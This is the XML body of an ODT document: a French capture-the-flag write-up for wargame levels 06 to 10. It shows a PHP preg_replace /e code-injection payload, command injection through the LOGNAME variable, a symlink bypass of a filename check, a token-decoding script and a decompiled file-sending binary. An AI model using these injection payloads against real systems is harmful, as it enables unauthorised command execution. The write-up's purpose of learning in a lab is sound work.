      <text:p text:style-name="P33"><text:span text:style-name="T20"><text:tab/></text:span><text:span text:style-name="T26">$a</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">preg_replace</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"/\]/"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T23">")"</text:span><text:span text:style-name="T20">,</text:span> <text:span text:style-name="T26">$a</text:span><text:span text:style-name="T20">);</text:span> </text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T19"><text:tab/>return</text:span> <text:span text:style-name="T26">$a</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T26">$r</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">x(</text:span><text:span text:style-name="T26">$argv</text:span><text:span text:style-name="T20">[</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">],</text:span> <text:span text:style-name="T26">$argv</text:span><text:span text:style-name="T20">[</text:span><text:span text:style-name="T27">2</text:span><text:span text:style-name="T20">]);</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T19">print</text:span> <text:span text:style-name="T26">$r</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P28">?&gt;</text:p>
      <text:p text:style-name="P3">Le premier <text:span text:style-name="T5">preg_replace </text:span>est bien sûr celui qui nous intéresse, car il comporte la spécification <text:span text:style-name="T5">/e</text:span>, qui permet à <text:span text:style-name="T5">$replacement </text:span>de ne pas être une simple string, mais du code PHP.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Imaginons qu'on ait, dans un fichier, la string <text:span text:style-name="T11">[x hello.hello@hey[]]</text:span>. Voilà la sortie du script :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images27" text:anchor-type="paragraph" svg:width="11.194cm" svg:height="2.701cm" draw:z-index="26"><draw:image xlink:href="Pictures/2000000700002BB900000A8C25E22220.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P10"><text:span text:style-name="T18">&gt; Le premier </text:span><text:span text:style-name="T5">preg_replace </text:span><text:span text:style-name="T18">remplace </text:span><text:span text:style-name="T13">[x hello.hello@hey[]]</text:span><text:span text:style-name="T18"> par l'output de la fonction </text:span><text:span text:style-name="T13">y("hello.hello@hey[]")</text:span><text:span text:style-name="T18"> , le spécificateur </text:span><text:span text:style-name="T13">/e</text:span><text:span text:style-name="T18"> permettant bien au $replacement d'être interprété comme du code PHP, et donc un appel à la fonction y définie juste avant.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; La fonction y remplace tous les points par des " x ", et tous les @ par " y".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P10"><text:span text:style-name="T18">&gt; Les deux </text:span><text:span text:style-name="T5">preg_replace</text:span><text:span text:style-name="T18"> finaux de la fonction </text:span><text:span text:style-name="T5">x </text:span><text:span text:style-name="T18">remplacent les brackets par des parenthèses.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On se retrouve donc bien avec notre string d'output. Imaginons maintenant que dans notre fichier d'input (par exemple /tmp/payload), on ait le contenu suivant :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">[x ${´id´}]</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P10"><text:span text:style-name="T18">Voilà le code PHP qui sera exécuté dans le premier </text:span><text:span text:style-name="T5">preg_replace</text:span><text:span text:style-name="T18"> :</text:span></text:p>
      <text:p text:style-name="P9">y("${´id´}")</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On a déjà rencontré ce genre de manipulations dans le challenge <text:span text:style-name="T5">LoveTok </text:span>(HackTheBox_Shocker13.odt), où j'avais déjà écris :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P22"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T29">"</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T31">En PHP, les backticks permettent d'exécuter des commandes système, de la même manière que les </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T31">fonctions </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T32">system</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T31">, </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T32">exec</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T31">, etc... Et le nom d'une variable peut tout à fait être défini par l'output d'une commande système : ainsi, la fonction y va exécuter la commande système pour essayer de trouver le nom de la variable. Cela va nous produire une erreur PHP car il n'y a pas de variable du nom de l'output de la commande </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T32">id</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T31">, mais cette commande aura été exécutée par le système, et c'est tout ce </text:span></text:span><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T31">qui nous intéresse.</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T29">"</text:span></text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Ainsi, l'output avec ce fichier de payload est le suivant :</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr4" draw:name="images28" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.845cm" draw:z-index="27"><draw:image xlink:href="Pictures/200000070000690300001193A08A1542.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">Le warning nous prouve bien que notre commande system a été exécutée. De là, on récupère le flag avec le payload :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">[x ${´getflag &gt; /tmp/flag´}]</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">En effet, le wrapper permet au script PHP d'être exécuté en tant que l'utilisateur <text:span text:style-name="T5">flag06</text:span>, la commande system injectée le sera également, et le fichier contiendra l'output de cette commande qui révèle le flag.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr3" draw:name="images29" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.828cm" draw:z-index="28"><draw:image xlink:href="Pictures/2000000700005894000013F31CD1A76B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list1962302612909272014" text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P55">Level 07</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P4">Dans le dossier <text:span text:style-name="T5">home</text:span> de l'utilisateur <text:span text:style-name="T5">level07</text:span>, on trouve un binaire SUID / SGID appartenant à <text:span text:style-name="T5">flag07</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On transfert le binaire sur notre machine pour l'analyser. Un désassemblage par ghidra nous révèle une fonction assez simple :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images30" text:anchor-type="paragraph" svg:width="8.601cm" svg:height="9.5cm" draw:z-index="29"><draw:image xlink:href="Pictures/20000007000021980000251C09165BE7.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">On se contente ici d'enregistrer le résultat de <text:span text:style-name="T11">getenv("LOGNAME")</text:span> dans une variable, puis d'appeler sprintf pour construire la string "<text:span text:style-name="T11">/bin/echo &lt;logname&gt;</text:span>".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Un call <text:span text:style-name="T5">system </text:span>est enfin effectué sur la string ainsi construite.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Que se passe-t-il si on manipule la valeur de notre variable d'environnement LOGNAME ? Par exemple si on lui donne la valeur "<text:span text:style-name="T11">bruh; id</text:span>" ?</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le programme exécutera la commande <text:span text:style-name="T11">system("/bin/echo bruh; id")</text:span>, provoquant une injection de commande. On utilise cette injection pour récupérer le flag :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr3" draw:name="images31" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.983cm" draw:z-index="30"><draw:image xlink:href="Pictures/2000000700004A1C0000115E8EA03B5D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list9124853998313906298" text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P56">Level 08</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P4">Pour ce level comme pour le level précédent, on trouve un binaire SUID / SGID dans le dossier <text:span text:style-name="T5">home </text:span>de l'utilisateur <text:span text:style-name="T5">level08</text:span>. On y trouve également un fichier <text:span text:style-name="T5">token</text:span>, qu'on ne peut lire / exécuter et dans lequel on ne peut pas écrire :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images32" text:anchor-type="paragraph" svg:width="14.607cm" svg:height="4.897cm" draw:z-index="31"><draw:image xlink:href="Pictures/200000070000390E000013201CB83C11.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">Lorsqu'on exécute <text:span text:style-name="T5">level08</text:span>, on tombe sur le message d'erreur suivant :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">./level08 [file to read]</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Ce binaire permet donc apparemment de lire un fichier. Je suppose que le but est de lire le fichier <text:span text:style-name="T5">token </text:span>qui est dans notre dossier actuel et qui contient très probablement le résultat de la commande <text:span text:style-name="T5">getflag</text:span>. Cependant, lorsqu'on essaie simplement la commande suivante :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">./level08 token</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On a un message d'erreur "<text:span text:style-name="T11">You may not access 'token'</text:span>". On transfert le binaire sur notre machine Kali pour l'examiner rapidement. Cette fois, au lieu de ghydra (qui rend l'exercice peut-être un peu trop simple), on passe par un débugger (j'utilise ici <text:span text:style-name="T5">edb</text:span>) :</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr5" draw:name="images33" text:anchor-type="paragraph" svg:x="0cm" svg:y="0.556cm" svg:width="16.999cm" svg:height="7.442cm" draw:z-index="32"><draw:image xlink:href="Pictures/2000000700005D06000028BA6F0E6010.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On trouve un passage qui montre l'utilisation de la fonction C <text:span text:style-name="T5">strstr</text:span>, avec la chaîne ASCII "token". On voit que suite à l'appel <text:span text:style-name="T5">strstr</text:span>, on vérifie si EAX est égal à 0 (test eax, eax), donc si on a trouvé la substring <text:span text:style-name="T5">token </text:span>dans la chaîne générale. Si on l'a en effet trouvé, on voit un appel à <text:span text:style-name="T5">printf </text:span>avec le message "You may not access ...".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On déduit de tout cela que le binaire refuse d'afficher un fichier dès lors que son path contient le mot "token".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Pour bypass cette mesure de sécurité et tout de même afficher le contenu de ce fichier, on se contente de créer un <text:span text:style-name="T5">symlink </text:span>pointant vers <text:span text:style-name="T5">token</text:span>, puis de donner au binaire le symlink. L'appel à <text:span text:style-name="T5">open </text:span>ouvrira la cible du SYMLINK, et on aura bien les droits de le faire puisque le binaire est <text:soft-page-break/>SUID, et on en récupérera le contenu :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr4" draw:name="images34" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.533cm" draw:z-index="33"><draw:image xlink:href="Pictures/200000070000506A00000BFE0D72419F.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le contenu du fichier nous permet de nous connecter en tant que <text:span text:style-name="T5">flag08</text:span>, de lancer getflag, puis de nous connecter à <text:span text:style-name="T5">level09</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list7890598506350232354" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P57">Level 09</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Comme d'habitude, on trouve un binaire SUID / SGID nomme <text:span text:style-name="T5">level09 </text:span><text:s/>dans le directory <text:span text:style-name="T5">home </text:span>de l'utilisateur. On essaie de le lancer, et on récupère un message "<text:span text:style-name="T11">You need to provide only one arg</text:span>" nous est renvoyé.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On essaie donc avec un argument, et on récupère le résultat suivant :</text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images35" text:anchor-type="paragraph" svg:width="9.209cm" svg:height="1.563cm" draw:z-index="34"><draw:image xlink:href="Pictures/20000007000023F90000061A43636B81.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">On s'aperçoit assez vite que ce programme ne fait que décaler les caractères de la chaîne qu'on lui passe en argument, sur le modèle suivant :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3">Décalage :</text:p>
      <text:p text:style-name="P3">&gt; 1ère lettre<text:tab/>| 0<text:tab/>(a = a)</text:p>
      <text:p text:style-name="P3">&gt; 2ème lettre<text:tab/>| 1<text:tab/>(b = c)</text:p>
      <text:p text:style-name="P3">&gt; 3ème lettre<text:tab/>| 2<text:tab/>(c = e)</text:p>
      <text:p text:style-name="P3">&gt; 4ème lettre<text:tab/>| 3<text:tab/>(d = g)</text:p>
      <text:p text:style-name="P3">&gt; etc...</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Dans le dossier <text:span text:style-name="T5">home</text:span>, on trouve également un fichier <text:span text:style-name="T5">token</text:span>, auquel il nous est possible d'accéder en lecture. Lorsqu'on essaie de l'afficher, on ne voit qu'une chaîne qui comporte des caractères non-imprimables :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images36" text:anchor-type="paragraph" svg:width="7.646cm" svg:height="1.693cm" draw:z-index="35"><draw:image xlink:href="Pictures/2000000700001DDF0000069EC0358C65.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">Ce qu'il est cependant intéressant de remarquer est que le début de la chaîne semble constitué de caractères imprimables, et que c'est surtout vers la fin qu'on retrouve des non-imprimables. Un indice important pour nous indiquer que le contenu du fichier <text:span text:style-name="T5">token </text:span>a été soumis au binaire d'encoding <text:span text:style-name="T5">level09</text:span>, qui a décalé l'ensemble de ses caractères.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">De là, il nous suffit d'inverser l'encoding, ce qui n'est vraiment pas difficile. Il suffit de lire la chaîne <text:soft-page-break/>caractère par caractère, et de soustraire au code du caractère 0 pour le premier, 1 pour le second, 2 pour le troisième...</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Bref, on transfert le fichier <text:span text:style-name="T5">token </text:span>sur notre machine Kali, et on rédige le script suivant :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P38"><text:span text:style-name="T20">f</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T28">open</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T23">"token"</text:span><text:span text:style-name="T20">,</text:span><text:span text:style-name="T23">"rb"</text:span><text:span text:style-name="T20">)</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20">encoded</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">f.read()</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20">result</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T23">""</text:span></text:p>
      <text:p text:style-name="P33"><text:span text:style-name="T20">i</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T27">0</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33"><text:span text:style-name="T19">for</text:span> <text:span text:style-name="T20">c</text:span> <text:span text:style-name="T19">in</text:span> <text:span text:style-name="T20">encoded</text:span> <text:span text:style-name="T20">:</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">c</text:span> <text:span text:style-name="T20">-=</text:span> <text:span text:style-name="T20">i</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T20">(c</text:span> <text:span text:style-name="T20">&gt;</text:span> <text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">:</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="8"/><text:span text:style-name="T20">result</text:span> <text:span text:style-name="T20">+=</text:span> <text:span text:style-name="T28">chr</text:span><text:span text:style-name="T20">(c)</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">i</text:span> <text:span text:style-name="T20">+=</text:span> <text:span text:style-name="T27">1</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P26"><text:span text:style-name="T28">print</text:span><text:span text:style-name="T20">(result)</text:span></text:p>
      <text:p text:style-name="P3">Le script est très simple. Il lit l'intégralité du fichier <text:span text:style-name="T5">token</text:span>, et pour chaque caractère lui soustrait la valeur <text:span text:style-name="T5">i</text:span>, qui est incrémentée à chaque tour de boucle. La petite condition c &gt; 0 est présente car parfois un caractère <text:span text:style-name="T5">newline </text:span>se cachait à la fin du fichier, et lui retirer <text:span text:style-name="T5">i </text:span>produisait un nombre négatif, et donc une erreur python.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Bref, on lance le script, et on obtient un token qui fonctionne pour nous connecter au compte <text:span text:style-name="T5">flag09</text:span>. On récupère le flag, et on passe au <text:span text:style-name="T5">level10</text:span>.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">✔️[OK]<text:tab/>Ressources</text:p>
      <text:p text:style-name="P14">[OK]<text:tab/>Flag</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list1183981051399117950" text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P58">Level 10</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On trouve un binaire SUID / SGID, et un fichier token auquel on a pas accès :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images37" text:anchor-type="paragraph" svg:width="14.79cm" svg:height="4.394cm" draw:z-index="36"><draw:image xlink:href="Pictures/20000007000039C7000011290C7A8DFC.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">En lançant le binaire sans aucun argument, on tombe sur le message d'usage suivant :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9">./level10 &lt;file&gt; &lt;host&gt;</text:p>
      <text:p text:style-name="P9"><text:tab/>sends file to host if you have access to it</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Il s'agit donc apparemment d'un programme qui envoie un fichier que l'on choisit par le biais du réseau. On essaie la commande :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P9"><text:soft-page-break/>./level10 /etc/passwd 192.168.1.5:1234</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Avec un netcat tournant sur le port 1234 sur notre hôte. Cependant, il semble que le programme envoie les données sur le port 6969. On fait donc tourner notre netcat sur ce port, et le transfert de fichier fonctionne correctement, on reçoit bien <text:span text:style-name="T11">/etc/passwd</text:span> :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr4" draw:name="images38" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="2.524cm" draw:z-index="37"><draw:image xlink:href="Pictures/2000000700004BDD00000B457415A45E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">Bien sûr, l'objectif va ensuite être d'envoyer le fichier <text:span text:style-name="T5">token</text:span>. Mais en essayant une simple commande <text:span text:style-name="T11">./level10 token 192.168.1.5</text:span>, on a le message d'erreur "<text:span text:style-name="T11">You don't have access to token</text:span>".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Comme d'habitude, on transfert le fichier sur notre machine Kali pour pouvoir un peu l'analyser. Après avoir désassemblé le binaire par ghydra, on se rend compte que le mécanisme de contrôle d'accès est un peu plus robuste que le check précédent :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P38"><text:span text:style-name="T19">int</text:span> <text:span text:style-name="T25">main</text:span><text:span text:style-name="T20">(</text:span><text:span text:style-name="T19">int</text:span> <text:span text:style-name="T20">argc,</text:span><text:span text:style-name="T19">char</text:span> <text:span text:style-name="T20">**argv)</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P34">{</text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">[déclaration des variables, snip...]</text:span></text:p>
      <text:p text:style-name="P33"><text:s/></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">local_14</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">*(</text:span><text:span text:style-name="T19">int</text:span> <text:span text:style-name="T20">*)(in_GS_OFFSET</text:span> <text:span text:style-name="T20">+</text:span> <text:span text:style-name="T27">0x14</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T20">(argc</text:span> <text:span text:style-name="T20">&lt;</text:span> <text:span text:style-name="T27">3</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">printf(</text:span><text:span text:style-name="T23">"</text:span><text:span text:style-name="T24">%s file host\n\tsends file to host if you have access to it\n</text:span><text:span text:style-name="T23">"</text:span><text:span text:style-name="T20">,*argv);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">exit(</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">}</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">pcVar6</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">argv[</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">];</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">__cp</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">argv[</text:span><text:span text:style-name="T27">2</text:span><text:span text:style-name="T20">];</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T20">iVar2</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">access(argv[</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">],</text:span><text:span text:style-name="T27">4</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="2"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T20">(iVar2</text:span> <text:span text:style-name="T20">==</text:span> <text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">printf(</text:span><text:span text:style-name="T23">"Connecting to %s:6969 .. "</text:span><text:span text:style-name="T20">,__cp);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">fflush(stdout);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">iVar2</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">socket(</text:span><text:span text:style-name="T27">2</text:span><text:span text:style-name="T20">,</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">,</text:span><text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">local_20</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">local_1c</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">local_18</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T27">0</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">local_24</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T27">2</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">local_20</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">inet_addr(__cp);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">uVar1</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">htons(</text:span><text:span text:style-name="T27">0x1b39</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">local_24</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">local_24</text:span> <text:span text:style-name="T20">&amp;</text:span> <text:span text:style-name="T27">0xffff</text:span> <text:span text:style-name="T20">|</text:span> <text:span text:style-name="T20">(uint)uVar1</text:span> <text:span text:style-name="T20">&lt;&lt;</text:span> <text:span text:style-name="T27">0x10</text:span><text:span text:style-name="T20">;</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">iVar3</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">connect(iVar2,(sockaddr</text:span> <text:span text:style-name="T20">*)&amp;local_24,</text:span><text:span text:style-name="T27">0x10</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T20">(iVar3</text:span> <text:span text:style-name="T20">==</text:span> <text:span text:style-name="T20">-</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T20">printf(</text:span><text:span text:style-name="T23">"Unable to connect to host %s\n"</text:span><text:span text:style-name="T20">,__cp);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T20">exit(</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">}</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T20">sVar4</text:span> <text:span text:style-name="T20">=</text:span> <text:span text:style-name="T20">write(iVar2,</text:span><text:span text:style-name="T23">".*( )*.\n"</text:span><text:span text:style-name="T20">,</text:span><text:span text:style-name="T27">8</text:span><text:span text:style-name="T20">);</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T20">(sVar4</text:span> <text:span text:style-name="T20">==</text:span> <text:span text:style-name="T20">-</text:span><text:span text:style-name="T27">1</text:span><text:span text:style-name="T20">)</text:span> <text:span text:style-name="T20">{</text:span></text:p>
      <text:p text:style-name="P33"><text:s text:c="6"/><text:span text:style-name="T20">printf(</text:span><text:span text:style-name="T23">"Unable to write banner to host %s\n"</text:span><text:span text:style-name="T20">,__cp);</text:span></text:p>
